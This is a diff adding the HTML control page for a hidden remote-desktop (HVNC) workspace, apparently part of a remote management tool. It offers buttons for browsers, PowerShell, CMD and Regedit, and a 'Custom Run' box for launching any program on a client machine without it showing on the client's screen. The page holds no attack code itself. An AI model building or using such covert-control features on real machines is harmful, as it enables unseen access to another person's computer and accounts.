@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRMM Hidden Virtual Workspace (HVNC)</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Top Navigation Bar -->
+        <header class="top-nav">
+            <div class="brand">
+                <div class="logo-badge">HVNC</div>
+                <div class="title-group">
+                    <h1>Tactical RMM — Background Workspace</h1>
+                    <span class="subtitle">Isolated Hidden Desktop Session</span>
+                </div>
+            </div>
+
+            <div class="nav-controls">
+                <div class="status-indicator" id="statusIndicator">
+                    <span class="dot"></span>
+                    <span class="status-text" id="statusText">Connecting...</span>
+                </div>
+                <div class="stat-pill" id="fpsCounter">FPS: 0</div>
+                <div class="stat-pill" id="resDisplay">1280 × 720</div>
+            </div>
+        </header>
+
+        <!-- Quick Launch Bar -->
+        <div class="quick-launch-bar">
+            <div class="launch-group">
+                <span class="group-label">Browsers</span>
+                <button class="launch-btn chrome-btn" onclick="launchApp('chrome')">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
+                    Chrome (Isolated)
+                </button>
+                <button class="launch-btn edge-btn" onclick="launchApp('edge')">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L10 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H9v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/></svg>
+                    Edge
+                </button>
+            </div>
+
+            <div class="launch-group">
+                <span class="group-label">Tools & Shells</span>
+                <button class="launch-btn" onclick="launchApp('explorer')">📁 Explorer</button>
+                <button class="launch-btn" onclick="launchApp('powershell')">💻 PowerShell</button>
+                <button class="launch-btn" onclick="launchApp('cmd')">⌨️ CMD</button>
+                <button class="launch-btn" onclick="launchApp('regedit')">⚙️ Regedit</button>
+                <button class="launch-btn" onclick="launchApp('taskmgr')">📊 TaskMgr</button>
+                <button class="launch-btn" onclick="launchApp('notepad')">📝 Notepad</button>
+            </div>
+
+            <div class="launch-group right-align">
+                <button class="launch-btn custom-btn" onclick="openCustomModal()">➕ Custom Run</button>
+            </div>
+        </div>
+
+        <!-- Main Display Viewport -->
+        <main class="viewport-container" id="viewportContainer">
+            <div class="canvas-wrapper" id="canvasWrapper">
+                <canvas id="screenCanvas" width="1280" height="720" tabindex="0"></canvas>
+                <div class="focus-overlay" id="focusPrompt">Click inside canvas to enable keyboard & mouse controls</div>
+            </div>
+        </main>
+
+        <!-- Custom Launch Modal -->
+        <div class="modal-backdrop" id="customModal">
+            <div class="modal-card">
+                <h3>Launch Custom Application</h3>
+                <p>Run any executable file inside the hidden workspace without showing on the client's screen.</p>
+                <div class="input-field">
+                    <label>Executable Path</label>
+                    <input type="text" id="customPathInput" placeholder="C:\Windows\System32\mspaint.exe">
+                </div>
+                <div class="input-field">
+                    <label>Arguments (Optional)</label>
+                    <input type="text" id="customArgsInput" placeholder="--my-arg">
+                </div>
+                <div class="modal-actions">
+                    <button class="btn btn-secondary" onclick="closeCustomModal()">Cancel</button>
+                    <button class="btn btn-primary" onclick="submitCustomLaunch()">Launch in Hidden Session</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/app.js"></script>
+</body>
+</html>
